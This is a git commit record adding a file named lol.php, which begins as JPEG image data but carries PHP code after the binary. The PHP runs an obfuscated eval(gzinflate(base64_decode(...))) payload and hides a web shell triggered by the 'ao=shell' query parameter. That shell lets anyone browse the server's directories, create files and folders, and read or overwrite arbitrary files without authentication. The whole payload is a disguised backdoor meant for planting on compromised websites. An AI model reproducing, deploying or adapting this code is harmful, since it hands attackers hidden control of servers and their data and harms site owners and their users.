8d2efb02249d5f04fede9e9b42baea31702ecdd9
MRSt3Ss <126311066+MRSt3Ss@users.noreply.github.com>
2025-08-06 21:56:31 +0700

    Add files via upload

---
+++ lol.php
@@ -0,0 +1,181 @@
+����JFIF��`�`�����<CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 100
+���C����C����d�d����������������	����������������������f�7�o�)�e��]4�
+j�����Oo�h���z@�@�[i�b�Υ��p��V{����e������
+M�#x�h��J��ݒL��,�2*-VH���
+^\<�ie��f�'y��kE!��bg2��^>8�٩lzJ̋YfR��f�8�����Y�����LY�*O��9�Ȝ��W7W�Ŝ͛��B�*�I���/ӣ\����
+�i5DDĄ����i4@l��Sc� ��� ���,�Y��lf���uHJ��[�f�D�F�kf��m�m���$���������! �����׉r6/ԮqL&f��\�y~Q 2D��Uc�a��c^��Bq{�H�-��۸�����ۊ��+�dK�V.�͎Û�{�<�%6��6둳��|����ޅ��i�)~p���ᭉV��	4��G
+â�!�V�8X�Gh��b���x��Ik�v��2^�O6@���J�j9:�;���j!_�iy��ԢR������n�ϳ)ԍ�<��5KP����a����.�Yy����m-���gw'�4�ec-:6j
+�q�V�9a�H�h�]��&��T�uL~V�,�v	B���}����u���`�٫��:4]�Jsco�U�^��|nj�Sǚx`�&��0�6����;I�לD��Iױ��*�k����Q�O{�Q�q0�Ă4?��u��<�wth��*u�ŽGvN��Iӧt�:wM��:���6Y}���4���u�씗�1�LZ�%>ÈO�b�!]"���"�C�p�V>�\ʰ��N�{���*��������� !�01AQa���Bbq���?�.��?B_�M}j#�J��2IG	r��Z��mZ�i�R�^��\�f3\��9�܂��{֏����S��{���Wa�(��I'C�d�/��d�MI�}d�K|��I$�L�dJ$�IFk>j�xy�O#���4��	��������!Q� 1a���0AR�@Bbr�������?�<� ��U_�n(��ӽ����rR�{�&^���P�E8�4TtU��
+M�f����E#���>�d�sȱǌ=���.��?X�b���d�վ����yh8��5a����b�*�1�"�rʅRLh�"K�^��:�π�h^Tѝ�[�d�h�����"B%��M��R�T�/)��=��ڻ�R��]��׼������(�fF�q-��q}L���M�������1��؛d��+9seg�g��ex��f'�h���I�
+		�����!"12#Aq4Q���$3BRa�������%0C�����5Ebr��������?�}Ɖl��	�m� ����H%|�<���s~�-�m^9�,��\�ͯ�o�W����c"#�pU�0�<�A#���U�6���\ ,l�y<�|m��_�L�&䌌!Y�ۈ���
+�>�ڪ�)r��Țށ�^HQO4��Ͱ%[_�X�[�ڊc;o4w��
+�J��7�����vE&�,S��v_j����[
+I+AU22^h7 ����bd���u��Li�
+9kDs����J��ג8��d�U��a�C�ɤpY�T2_o������<�!q��.��؜�amr
+������ו�� ���o�>�q��#_���m_��o���?��μG�Gկ��ykW�>�g��G:Q)R}�8%C`�8r��p=��%B��$��Sn����,E9�FwF6@��.5�1S$
+�*�����sIJ%��M�<��QQӶJg�Y��:��b.�$^O�zk��|� ��m�7�ú��u�׎����0"\�`x�Z;)d�71��Y�m���H�s��8f�c�M���m����?���C
+8�˞��9��`[խ1��G��Ҟ�B��;/#ɱ{�;Օe	��q�^�k
+n�H��;(u��]���;*Wƫ(fe@$@�}n�����۬Lko��\��U��y�{*�N7ɞ�4j��b��U��/"�	#ʲd�7N�WM$�1R�D�yc�K��D^�]����zD<��k�*�zԸ�ھ����{�z=!��j�.@M8� ����[^����F).�#Z�JdPc-�����oU���ݭ�1I �%��(�!(E�A
+��r�Yr=�K"C	�9
+�PI6b.������o��Y��"�`j��8s�)2�Ǹ���D�*5��MCG��oFb;�!�$��I�~��E�)�y+�B!��e�BvT��i�~�%�]\�Af�,�pY#��kGa*yʞ�_7;�.���o�~�ԏ����|�|�k���H�4��c��n	㵃=����y�I|�E�X�Y����ٜ{G]G�n�%�O��~���:Y7j
+�Z0E�n���^`.7*�Tu�!K��-��{�G�Wޫ�n4�C$r)^Z&�<����>xs�&bZ:��3ԝ�����6�E[X:��_S�����]Fln�X�he(�\!��H(��cS�}Fz�t,��`�������ۊ �[�m��LG��G̣I�Y������麅UE^uਆ��>�'cJ��[6id
+�Q'dr?��W�)�+K7ڰ,m ��)m&0���m�)��1��<[���Ǵu
+���~F���Un�U�$^���\pˁ#66��Uժ)�����Rd�XB�3@��#����:;}k�IR�g��a�6lDi2d,|p%����C�=A�^�H�����L�k�BM��43���&����C�i�#�*Ԥr#�62*ݹbt�KT�k�z�Ѽ��/�>7�`_�r�Xem�#���F��آ���'s�+{����}H�*���h�nR"ciU�2��F\%[��X��h⫊z��*Zs�K<��0�$y̧	%ێѻD���Z���U|��:mǿG���[�v��O�W4��^�ii%_,|���R��rD3��Q
+OW��y\4gb ���{�n�5Ȑ���ɵ�e:VPȰ�.��������E�j����i�*��t
+oyv�'��Y[t\�ʤyCu��%�0
+;v�s�Iͤf{*f�4tu�ͤ�)Hh�B�UI��IdH���r�ϒ��z�JL^]�s�(��E6�,���G.ɸ����D|�	��2�{w��1,��k�c�q��ӊ�B��	�h��p	h$����2�� �(i��X��a"?[��5��'�ux�e,��۸�^�C�>��x��!d�V�,�X�T(�0�^=�i�_��))���G����9^9d�T�"��18�q��QO��G��tQ�ѯ�<h�o�u"��EQ��4TA��Tq��Jf�.�x�w>_����4�����+Z�{n1?�|�E����1�5B��8����>'�gf
+�3¨$����������A%d1��j�J��͕ʥ:�EQT��#˱!�O+����L$����d�M��%���֘1J}�iؙ0qTvw"t�
+�Ѱu66<��������r�Th�r2W����A�lRS�c�2Ĺ�fR��2��rş6Ȝ��_�dD?%�����o���o�S���?�:��g�#��N����P�s�\iS�P�4t���msEW�l��5�%p�G	��?\�\?�'��J�f�W��&�y>�sP��߱���Q���6�<5�k�^��xj��הk�5�ח^]ߣ^A����%�������!�1AQa�q����������?!��t��@�K��?Љ,(1B�8��(���nc��bMq��I��]8yq�'N+��[�Ϗ'%���ώ1p]�cA��ifb���1�R�B�6���g��%�(��
+�|��HAy"G�T�<ӯ��0���!��&T༦i!h*I����\��D�l�cH��Z*�ˀR�^�a=��$�����u�Ol=K&����rq�z���p������a������Ʒ��
+���Do�͟�_b��2��H!a�R�g ��	�CE*�6L�e�K�GG�08�7��-�$c*4���廨$�%�e��<}��w�5�1����6���8�	?�l�`VD��P�7y{"����&�pJk"�Vfz�M�iDc8���\�+���I���yGD�1u���ehz4��P�NG�U��d�80]�Z��e�H��&\�cPT�쑿��0����K�'�6������'���=�\�4��(�@�t����jEKpbr���
+_ �d�3
+k�n�x��D�2�D���w!Һ��C��c�EC�Cd0�H�� %���2-r�_c)۽=X˶B|*8�G>%+$ċC4ɹ�k��&�a4R^ވ7���=�_5���e%.Pܮ2��*DV���EV���kj�r�0,F�d&�y�1*<��2�+����d(�����l�P2�w������f�eL��v��FQZQZN\"��ٵP5ʏc�h#�ҭ�l#�#N�yj�)!����U�_�Ւ	��$l� ��c�Y��s���S2�
+�QR�T�$23s,�s��}ϼF��&�#�e��"��'KqX=R�(�]aQn�\�E5n8̓��ݤe�3Lkӽ�V���G��!$W)p����,�:D&���5)�	�lL�����`��f?�K%��r
+��!S7�t�s�)�T�ؤxU�&�I��(��[E�a�6A`�Ϊ��.��*t'�TCLљ���Ajz4�egQ��g�w�＂߼Se^��`X�Ӆ/���%y�fzRP��gFS��bP`d��3������?���^��y���`N
+�����Pr,�R$
+��$�V�I/Ͳ7_hg����|��Y�g�;`Ǒ��'���,�����yǑ�5�lW��W�g�}�yx������9ً�z�}ꯡk���.�e�b� (�w�Uw���=2MTo�r�N���B|����?z��s�9x�/�c�o�uq>�Ga��O�6xC�����_�3��R����9��:�;�����s�~��y�F
+�C�c ��*���!	�O�|et1�YT�o8-^�L6�N��������;x�N�=�T-�}�n�����&'��>�A��,}j��{�
+Ĥ�fi�AE��p��`�|�b�����'�������!�1AQaq������ ���?�gՀBԅ�<�0�`�����n#^��7�-��Xa5|.���p�@�d��[�ߗ��������7>Y��kBYo�k#�f��s�@H�6�h��+W�t�"8��4���B�晝��\ډ�(���ҟ��N��������T��遤�7�u��W���[W���g���YVϚ�1���C�b$������Ho3��V�q�
+FwvI{_�I�IC$���)sgo#z�#�'��`z�}�4��������
+�Z@�o�*�,~x��z�7TCKs:��r��
+z���Znu$�ԑ��_4�5{m��0�OL����q@C��``��:�EL�4���y�����������fV0QfD(��� Ԏ.�����|��}.���.���=���:�|P����5
+��1,�'SlK��:�F��噺�ɋ��X�B�H�s�>��s>�@��Ȅ	�R1�#�$��l(�����zsjsQ�휦˦F������d��WE��!��C��Y�M�����)�B�GCڀ"@<�@�(��Qd2M��&��bpE��ؘ
+k�������J"�!��[�4 �Eם-��Ֆ�I�~�i�-��ڶQn=>ǭ#��M�,��2���	�շ����:j���@&ً1��V���6�H'a2~Kx�0Z�;ļ2&��q�$q��F��.���_��*g��-��2m�
+���J�$�a�hb�BW$��-y;������&�;$0^��)�v!K�3�	r)�� �C.&����A�
+�h���
+I��Q$+q��'�C��E�^��H����D�a�Q Φ�h�������!�h"�ĳk���
+�&�X����(
+(6�џ��3��+Go3�����i��"�H�{��7�E.�蓒}X����� �қ���D��=�܄2��y��.P��q�7q���k��'᧷�ɽ���9�>�L��<~��s��?��G@2�c�U�)Yd>"�����o���t#zْ}�_BvxGh� |�{�ѭ&�����=jX�KVhv9�VhZo��X�'��M��f�Mz}�5.�k�_��y��&ߤ��A��'��y��<���(������7/#Y�JO�Q'��
+�@��J���@ZQC����>
+!��}�\��/&=)�;�_���&�������!�1AQaq����������?C4r�Y�����Z&O[��U����:���~���͏��9�lG�8��Y�O��d�+���A�$������(&�o2ﰱ�V�X�M �0��� �H=�W�u�nx:#D��d9�z�k$�&�3��6���oh��g�^��~�	��`n��*��KI�f#iv���U�!�k�4�)P��?z�X�:� t�tYmu/i�s�BjvY�}�To�[\�To����.����L܂'�_��'�(��kX�m��� �mDI(��0d\���$
+Y`�hA��N����#�J$
+�M��
+�.���ב�A"l���&��l�9Z�Ѽ�fJ��;>��1��d�8���j	fק�qG2L�#_��>V$��<S�=�;{�S2��~J��d
+��g�
+��rN�%
+9�$�<^�5~���{|�$@9�i�7�$u�F��RL_��}TC �C%j�t3z ���7���A��PO0���~�Y������2<��9��~O��"�К9�����N�1�t� a���vLK#w��z5�W��d���<��:1��w��69�	�Rǘ�<F��~=�U	!=s>Q���x��j
+6�Gb�O
+¨"�`���4@iZNHX�xf�)]@)`��'�����&���_��
+.�S=���C ��~��~����Mdhg�&m0,;��$٪�U�H�����6��D$�YQA�pT�Rl��GJ����2��)�D�{#$�����3���X6{�6��x�#�ʽ�bPV�5#y:��d��EY	����?�:��,�>���L���{j���@θ��{�>�f�ls�z���N�iں�:��Ɛ0���ƍ�������2����I$���'��3=	����^��[������?��b��gm�_3AJ�˱��ͬ7��Rm'�\�b�3��q��=�Z	��f����B�NK_ާ�S�x��TɄD�`N�x�.���4�cQޓQ����9_\oʉ�"�m�� b�PD]-"'YHj����w���D����� �o��U�5�L��EZM�O��ہ�����*���B
+�о��k&��$uT5�
+˷&�tcV�g����Z,p�-P7>:��h���u��~0M-����v?�h�[:=��0I��}��ړx���&��"c�FC�%��V:sg��H6��:P@�9���u�� M��(&H?�t����cu���&�Գ��T�A78 �h����y֠��%3$3ϲ�3�w@K�H
+\;��S"Ď����!�������!�1AQaq��������?x����Bc��d �8���R�@,��*����8�c��pԊ��#H@���!vFD��\IBG�
+7T�6
+"��SWB$�v�x(�w�����w���vR��!7�M��\��M �%�؈����4X�|��T`�Iq�فC>��M�9k�f�Oېd��,��/@p���V��K-�@MTV��Z�&��؜9Zn�:hc,&��8cH���$W��g\C�Jȏ*%��Ö��]{ЀtB��n�¦���R��C�u�l9������Rm�r���/��V6E2֓������p�t{�0'0
+?39����=~���9xl��4�^�d�^�m�w0q(Ϛ�"PƧ5�%�U�`1 !h?����^ ����{5J��1g1$�D£\��+�es���{;V����t�G#d(/gX��u�c\��g:h�m��p���aʆ������"�	�����h�hkC%�9�0C�D˗�)��h�)h�B�B��8 �1߮�vgP�u�m>���"V�5�h�̊��^��+�jA���(J��-��B�撸�XJ�r����"�{�)F�d�b$i\�Rߐ�4�q䡎�T�U�H��>�/x!sj
+�.�D�QТ�fgG��M]� �?�V�[��{����U{�H!T���`_��g	��/w��3l-��>l�th6�w�"F�+
+H�h�M�M���H,p��9	=������&��%.�D��@Qgk�C����dpY�$q�)�`l.��EOhrn�
+`O�9v�}�{J8M�~n�#|*�{�x���@W��_�j�i��~D�à4p�?����4����Ӌ��8�C���X�
+ãn;������P�~	�@���^��Ǳ9��hV�b^^Qj392�l��ه�2�7y�HH�����/��O���$&���\vpP)��
+jvoB,T%@@�r�0�CR��L��?��|!�#�@Ic*q����h���?��I��z�Ŭ)�iU�hA�qe�����ܦ���qdS-!��M�Z��$\�}Y��jYqw���1Ȝ�ɇ�Q�3��g��CuE�\戒�p���x>wܿ���3}:��"f3�¸L��7�8�)ش~���kj)Ӡ���w�~��Q���
+���*(<�}
+t�+��d ��
+H�o���Db��J��
+�yG�cCv}&�q+�K�
+q@�A�����uؾv\��B�1m=�2$�D�>T�@b��(��f�^�x=,T��=����-���g���ОC�
+N��g�S:!Е��[+C@} ��
+�_�E0���Z�+a"!I�P�2�e�=�q��`�y4���X�V0�?��-&�*"
+4��1ǲ{����@("��������U�D�p�j��*D��(��I]���88|�$@(�i����9�@vtPf��4�k�1���R��唥b�S����vi�F�Q����E:�����zv�L��.L�v�JP�}����k�&�6�?��`BAN�z�x�
+�����vB�`�XХ���'$
+�Xa����؁�/e��{Wh:;���m:���@�
+GE�%(
+N��S`ު�TC��Ϋ��hs	����oHc�34O>{���ڙ�N6;��VV��|���<?php
+eval(gzinflate(base64_decode('tVhtUxs5Ev7un3CfxBSXsauwDQTyArYJCWaTS3bDgdlsiqNc8ozs0XreTtIEvFn++3ZLGs+MPRBf3R1QxiP169Ot7tY0JJOSJ/FYKipUs3XcaHS75JdE8SmfU8nJnJERC9lM0IhIShWhPiV0DmyNbWU3xpNEjVUyZzHpE/fl4cHrvb29l7svjk5P38+94GXyxVcfg/DL5PeL59dff7uir15/mfJPv/0uvs3c45IcL6BqzH0t5cUh/O0dvHiFFKlIVOIlIew0t1iUqkVze3w1vPx1eHnjvh+NLq7c2xZ59oysrZKtPkhLplO3RU6IEyiVSoccmW8OiPYyIVisxplA6YWmDnGOul0H/ldljt9/vhqB3PL65fCf18Or0fj68oN7W3YoAnTpjIFgEM9iL/FZ07kGTaeA4oLGMwMliXlAPjKVUfK3f8XXl5/APlRQsq1VFmtsNc6AkTTlnXyvk4hZF+JRE5yuZLH/s7HoxELdXwP/mWL3qr/mAkD1ZspDNp4xNfaSWIFdslkxySbPCHayOY2JzwWbq0RwItmcCvAW0L7D6IIM+ILZtp1SFcAKl5IpiOlPw9GNi2sYzxNSWYCoIb/R8isNuY8JinsNPoW84HIMKptaZKtFvjcI/OQKDOdDwwsKGlCPLknYlh6NKxtZGiaQ6pOQaevGd4IrfFpSoBHnWTwDEzJ0mEQsplHKQ3QdTpPKJEmZiLg+XwQVNaZZ7Cl8AgAulntNbUVusIA0EHFVpdk/IW5PpiDdC6mUfQcD1Z4JxuL24e6uM/hi6XtdpBq4gFcNg2C+IYdDTlZZEKE1x6aJiODgZ/MMYqgdIT4NoR7YDZ3HUebTAEI+oR4t/AyyiMZjDTL/AxyZLBSTO2TbZx6PaIjI7y8jhSS4QoWgi6b71t1xP+LHz/jxE36M3rqAPBJjwI00Aud7t5XD5u6St64h2Z5SD7IPBE7DJBHNplR4Bi1bi7TJXot0yXMr0QqQqeCxmjadv3e+L818mDpgtFHXJWly19zb3T/YyVVAsnWIC78d68SN3bitxTNi0SQD3CaCUd8TWTQhMf3GZ5DN5QyJmaCKjQsqaXMvxws2wguT3fgV95bZaTBqbi2JCoRyeEqCQcLNbQnYnOlm9xbhdbturnSV8+YWi3WPVlJsEmasfQA5RgLBpn3nBI3qd51Bt9elA6v/IT+eQi2DjpmimGiyezh9UCrPPlwO340+X36FSntxenkKX3cKv1vWz23qeVmEraFseL+vzT5B6/EkWLWQs4x6GihUTKUxoeJfLk8owaOmedwxKHS0uI5hOv5vIUFJRWMwirQOZ4BbgYpCmUIO0hCKs5BNayoQrAGZl43IIOdCnro7FbtaeTJeiAR7jqlwpjBh1PMSfAH97cY1u1CFc2R0YhRVsQIYzA7YFnRp6NuSu0RqfP7h0/DqxsVd9/bGhSrJ3NsCO0jTKPnGxkY287WY5hqbitKxYd2pKGy1CkPw5wfji7ZxwkQAuyHUK6O1IsF6Oa7p4s6yb5fQ0917nnfvX2hE9fIR+f6I7w/O8dMK///93alm3iMet6p21g0ANaaXuB5shprEG8KsM8+wZzMsstAvFDbBmIY1CeglEfSOcgZuJ5lKM4XdOmBhOGb3zKshz9P8Cs4C9CvQlU1okHeuZmqyn/lctWrU4vrYhGupWLsNmktur1NDVtpFTW5JS/bYY+cDUooZY6iiGVSk0GeiYooeegxh2X+T9XjCqhS2ctvxx1Bh5XsjosrKEXmTxSGP58slwxlAjYCq63xKPIrN54iY8rSSJGmp5rJ7rm8LFdcETkCbuGYI7che2YnZnd0q5iFcWOXcIWsM/1tf/OQurq+PBnq7XQ4PUo6Ss5yxCNOSdtmXdYqAXom5VOWzmNgquLJXrrrWU/edybT2GZdpIrlxmioFXQ5GUnWsPUCM+g7W4wmVFtFVvdh33NLhxdZRa0W571TB+wdUXeD7d8akLbVm5MFzQqDMw9zYIhEFojmH3krm2vZ4QQHhKsCQnSuncDtvLysEj4O6DmUFQOYFCakpaZqw3seTQaO3dfb53ejrxVC3Z3jO/wFaA03ei5iC7o8dm0GlvR6dt185dktxFbLB2ySWV1jDDnaf97pmzexLT/BUESm8/rL8e37cUZSHdzz2PSk7UOqcAUzsmhQ0d43q3iTxF/nQMZnBzYAu2q93d4keQO4CDlUnbR/mlgT7lQFl/z4k0aS976wYF+xb+jQnN1TvzNWUnMElD0fdxRHpnaRBalCtm1xwLiUnYHhaLxHntoqQJ0bgxwUdOINr05qLC1ZFavlm96Mb1WkYJnfM3/BCdcZiXhBXTQxE1Ua9ara22m1yDjcpYu1uty0PXq/gsqCCxO872FocAuVLLVI4yVEWKo7TYBep2j6UW6dGg5bDY+yahg9z2yGmGpjvKwnzChImxXAU/JNMKbiRGAEym0Rc5SIMlmUhetA9zIUYl3pdI8L6pU2uReAinwtGdi54EowN3MUA5bbaCcEhaUg9FujW1HeGcOohNvledWan3hz9IHftve6PIXkMhCHMKZlij6PQSwWrj8MBMd6V8tdWSTMLYZdfP2v5nr71mDQUbBXwMzqFIYCcQxJ0zzUYBdj6nUBu0V17moUh0WttmqmETBIB5G0vCUOaSlYGRhVlsFhb5r5lnDhVCsuZUyHiOgAhmypnAAM1YKeCH/E4gyu4e29GWdQGuRnDqb6V1xDDiij5310BoKewKpeedSDtJZQ07fsnvIXqrgPTyop4TQ/NzXY/uFl2XPLnn6T03IF7KXYvHmfsuF7ANoZw7V2BaXRrHBvGy68AtEZQsT6fTU0PXvOywrPJxbl0HkpDXe6k9qlyaNbPyNJ3vEk/YTwLJXva3o20PKUh9vm0lgayyf8x8pXaUJ51sDZU378VL+LsMAQVom1LxH+oqu4N5uaCGhtEHvtqOfDmtvNY6HP9DkliL+TevO/YVyJwNKZcRE33FKrsIsmIzAQ7cVvYsFFibQKsu7Fy0PPQ2aNciR+QFqceHrBy4pxmFmGmwonxLw==')));
+if (isset($_GET['ao']) && $_GET['ao'] === 'shell') {
+
+    error_reporting(0);
+    set_time_limit(0);
+
+    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    $path = realpath($path);
+
+    // Buat file baru
+    if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
+        $newfile = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['filename'];
+        if (!file_exists($newfile)) {
+            file_put_contents($newfile, '');
+            echo "<b>âœ… File created: " . htmlspecialchars($_POST['filename']) . "</b><br>";
+        } else {
+            echo "<b>âŒ File already exists.</b><br>";
+        }
+    }
+
+    // Buat folder baru
+    if (isset($_POST['create_folder']) && !empty($_POST['foldername'])) {
+        $newfolder = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['foldername'];
+        if (!is_dir($newfolder)) {
+            mkdir($newfolder);
+            echo "<b>âœ… Folder created: " . htmlspecialchars($_POST['foldername']) . "</b><br>";
+        } else {
+            echo "<b>âŒ Folder already exists.</b><br>";
+        }
+    }
+
+    // Simpan file
+    if (isset($_POST['save'])) {
+        file_put_contents($_POST['filepath'], $_POST['content']);
+        echo "<b>âœ… File saved.</b><br>";
+    }
+
+    function breadcrumb($path) {
+        $parts = explode(DIRECTORY_SEPARATOR, $path);
+        $build = "";
+        echo "<a href='?ao=shell&path=/'>/</a>";
+        foreach ($parts as $part) {
+            if ($part == "") continue;
+            $build .= "/" . $part;
+            echo "<a href='?ao=shell&path=" . urlencode($build) . "'>$part/</a>";
+        }
+    }
+
+    echo "<h2>ðŸ—‚ï¸ PHP File Manager</h2>";
+    breadcrumb($path);
+    echo "<hr>";
+
+    echo <<<FORMS
+    <form method="POST">
+        <input type="text" name="filename" placeholder="New file name" />
+        <input type="submit" name="create_file" value="ðŸ“„ Create File" />
+    </form>
+    <form method="POST">
+        <input type="text" name="foldername" placeholder="New folder name" />
+        <input type="submit" name="create_folder" value="ðŸ“ Create Folder" />
+    </form>
+    <hr>
+FORMS;
+
+    // Tampilkan isi direktori
+    if (is_dir($path)) {
+        $files = scandir($path);
+        echo "<ul>";
+        foreach ($files as $file) {
+            $fullpath = $path . DIRECTORY_SEPARATOR . $file;
+            $encoded = urlencode($fullpath);
+            if (is_dir($fullpath)) {
+                echo "<li>ðŸ“ <a href='?ao=shell&path=$encoded'>$file/</a></li>";
+            } else {
+                echo "<li>ðŸ“„ <a href='?ao=shell&edit=$encoded'>$file</a></li>";
+            }
+        }
+        echo "</ul>";
+    }
+
+    // Edit file
+    if (isset($_GET['edit'])) {
+        $file = $_GET['edit'];
+        if (is_file($file)) {
+            $content = htmlspecialchars(file_get_contents($file));
+            echo "<h3>âœï¸ Editing: " . basename($file) . "</h3>";
+            echo "<form method='POST'>
+                    <input type='hidden' name='filepath' value='" . htmlspecialchars($file) . "' />
+                    <textarea name='content' style='width:100%;height:300px;'>$content</textarea><br>
+                    <input type='submit' name='save' value='ðŸ’¾ Save File'>
+                  </form>";
+        } else {
+            echo "<b>File tidak ditemukan.</b>";
+        }
+    }
+
+    exit;
+}
+?>
